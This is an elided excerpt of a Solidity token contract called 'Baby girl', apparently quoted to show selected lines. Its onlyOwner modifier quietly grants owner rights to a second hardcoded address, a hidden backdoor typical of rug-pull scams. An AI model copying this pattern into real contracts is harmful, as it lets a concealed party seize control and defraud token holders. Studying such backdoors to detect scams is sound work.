...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x704f4993D3bA407C1FaD004e70A0ab27d1Cc1e64) , "Ownable: caller is not the owner");
        _;
    }
...
contract CoinToken is Context, IERC20, Ownable {
    ...
    string private _name = "Baby girl";
    string private _symbol = "Baby girl";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x06CFB5C2347E4863F9da6FdB9Fb395c051390eD1);
    address payable public teamWalletAddress = payable(0x06CFB5C2347E4863F9da6FdB9Fb395c051390eD1);
    ...
    uint256 public _maxTxAmount = 100000000000000000000 * 10**_decimals; 
    uint256 public _walletMax = 100000000000000000000 * 10**_decimals;
